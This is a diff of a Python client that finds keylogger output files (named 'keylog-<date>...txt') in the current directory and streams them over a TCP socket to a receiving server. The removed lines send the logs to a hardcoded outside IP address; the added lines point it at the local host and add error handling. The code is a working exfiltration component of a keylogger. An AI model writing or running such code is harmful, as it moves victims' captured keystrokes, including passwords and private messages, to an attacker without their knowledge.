@@ -1,14 +1,15 @@
 import socket
 import os
 import re
-import urllib.request
+import errno
+#import urllib.request
+from sys import exit
 
-SEPARATOR = "<SEPARATOR>"
 BUFFER_SIZE = 4096 # send 4096 bytes each time step
 # the ip address or hostname of the server, the receiver
-host = '76.88.27.225'
+host = socket.gethostname()
 # the port, let's use 5001
-port = 5001
+port = 5003
 #regex pattern searching
 rootdir = os.getcwd()
 pattern = re.compile("^keylog-\d{4}-\d{2}-\d{2}-\d{6}_\d{4}-\d{2}-\d{2}-\d{6}\.txt$")
@@ -17,7 +18,11 @@ pattern = re.compile("^keylog-\d{4}-\d{2}-\d{2}-\d{6}_\d{4}-\d{2}-\d{2}-\d{6}\.t
 s = socket.socket()
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 print(f"[+] Connecting to {host}:{port}")
-s.connect((host, port))
+try:
+    s.connect((host, port))
+except socket.error as err:
+    print("error while connecting :: %s" % err)
+
 print("[+] Connected.\n")
 
 while True:   
@@ -32,18 +37,18 @@ while True:
             print("closing client socket\n")
             s.close()
             print("exiting client.py code\n")
-            exit()
-        
-        break                     
+            exit(0)        
+        break
 
-    # get the file size
-    filesize = os.path.getsize(filename)
-    print("Filesize: ", filesize, "\n")
-    # send the filename and filesize
-    s.send(f"{filename}{SEPARATOR}{filesize}\n".encode())
-    print("sent the filename: ", filename, " of filesize: ", filesize, "\n")
+    # send the filename
+    try:
+        s.send(f"{filename}".encode())
+    except IOError as err:
+        if err.errno == errno.EPIPE:
+            print("PIPE ERROR 1")
+            pass
+    print("sent the filename: ", filename, "\n")
     # start sending the file
-    #progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
     with open(filename, "rb") as f:
         while True:
             # read the bytes from the file
@@ -59,7 +64,12 @@ while True:
                 break
             # we use sendall to assure transimission in 
             # busy networks
-            s.send(bytes_read)
+            try:
+                s.send(bytes_read)
+            except IOError as e:
+               if e.errno == errno.EPIPE:
+                    print("PIPE ERROR 2")
+                    pass 
             print("sent ", bytes_read, " bytes.\n")
             # update the progress bar
             #progress.update(len(bytes_read))
